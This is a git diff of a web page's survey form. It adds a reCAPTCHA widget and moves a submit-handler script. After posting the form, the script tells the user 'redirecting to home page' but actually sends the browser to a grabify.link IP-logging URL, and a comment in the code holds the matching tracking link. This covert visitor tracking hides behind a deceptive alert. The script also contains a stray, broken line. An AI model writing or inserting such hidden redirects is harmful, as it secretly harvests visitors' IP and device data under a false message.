@@ -114,19 +114,20 @@
                       maxlength="100"
                       placeholder="enter your comments here"></textarea>
         </div>
-        <div class="login-box">
-          <span></span>
-          <span></span>
-          <span></span>
-          <span></span>
-            <button onclick="validateForm()" type="submit" id="submit">
+        <form action="?" method="POST">
+          <div class="g-recaptcha" data-theme="dark" data-sitekey="6LeNdLkcAAAAAHLoKdLnOhrt0cgBBhXAHCir_9uN"></div>
+          <br/>
+          <input type="submit" id="submit" value="Submit">
+        </form>
+        <!-- <div class="login-box">
+            <button onclick="validateForm()" type="submit" id="submit" value="Submit">
                 SUBMIT TO DATABASE
           </a>
-        </div>
+        </div> -->
     </form>
 
 </div>
-
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.0/jquery-ui.min.js"></script>
 <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
@@ -146,29 +147,27 @@
     el.remove()
 });
 </script>
+<script>
+  var form = document.getElementById('survey-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action,{
+        method : "POST",
+        body: new FormData(document.getElementById("survey-form")),
+    }).then().then((html) =>
+    {
+      response => response.json()
+      alert('data submitted, redirecting to home page..')
+      document.forms[0].reset();
+      window.location.href = "https://grabify.link/J73F84";
+      // https://grabify.link/track/GJVYVM \\
+
+    });
+  });
+  </script>
+    <script src="./UTCtime.js"></script>
 </body>
 </html>
 
 
 
-    <script>
-        var form = document.getElementById('survey-form');
-        form.addEventListener("submit", e => {
-          e.preventDefault();
-          fetch(form.action,{
-              method : "POST",
-              body: new FormData(document.getElementById("survey-form")),
-          }).then().then((html) =>
-          {
-            response => response.json()
-            alert('data submitted, redirecting to home page..')
-            document.forms[0].reset();
-            window.location.href = "https://grabify.link/J73F84";
-            // https://grabify.link/track/GJVYVM \\
-
-          });
-        });
-        </script>
-      <script src="./UTCtime.js"></script>
-  </body>
-</html>
